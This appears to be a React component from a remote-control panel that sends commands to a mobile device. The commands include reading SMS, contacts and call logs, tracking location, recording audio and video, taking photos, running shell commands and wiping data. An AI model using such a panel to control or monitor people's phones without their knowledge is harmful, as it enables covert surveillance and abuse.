import { useState } from "react";
import { commandsApi } from "@/services/commandsApi";
import { toast } from "sonner";

export default function CommandCreator({ deviceId }: { deviceId: string }) {
    const [type, setType] = useState("");
    const [params, setParams] = useState<any>({});

    const COMMANDS = [
        "REBOOT",
        "LOCK_DEVICE",
        "WIPE_DATA",
        "GET_DEVICE_INFO",
        "GET_APPS",
        "GET_CONTACTS",
        "GET_SMS",
        "GET_CALL_LOGS",
        "GET_LOCATION",
        "TAKE_PHOTO",
        "RECORD_AUDIO",
        "RECORD_VIDEO",
        "EXECUTE_SHELL",
        "SEND_SMS",
        "MAKE_CALL",
        "CHECK_UPDATE",
        "DOWNLOAD_UPDATE",
        "INSTALL_UPDATE"
    ];

    function setParam(key: string, value: any) {
        setParams((p: any) => ({ ...p, [key]: value }));
    }

    async function send() {
        await commandsApi.create(deviceId, type, params);
        toast.success("Command sent");
        setParams({});
    }

    return (
        <div className="p-4 border-b border-border flex gap-4 items-end">

            <div className="flex flex-col">
                <label className="text-xs">Command</label>
                <select className="input" value={type} onChange={(e) => setType(e.target.value)}>
                    <option value="">Select one</option>
                    {COMMANDS.map((c) => (
                        <option key={c}>{c}</option>
                    ))}
                </select>
            </div>

            {type === "SEND_SMS" && (
                <>
                    <input className="input" placeholder="Number" onChange={(e) => setParam("number", e.target.value)} />
                    <input className="input" placeholder="Message" onChange={(e) => setParam("message", e.target.value)} />
                </>
            )}

            {type === "MAKE_CALL" && (
                <input className="input" placeholder="Number" onChange={(e) => setParam("number", e.target.value)} />
            )}

            {type === "EXECUTE_SHELL" && (
                <input className="input w-80" placeholder="Shell command" onChange={(e) => setParam("command", e.target.value)} />
            )}

            {(type === "RECORD_AUDIO" || type === "RECORD_VIDEO") && (
                <input type="number" className="input w-32" placeholder="Duration" onChange={(e) => setParam("duration", e.target.value)} />
            )}

            <button disabled={!type} onClick={send} className="btn-primary px-4">
                Send
            </button>

        </div>
    );
}
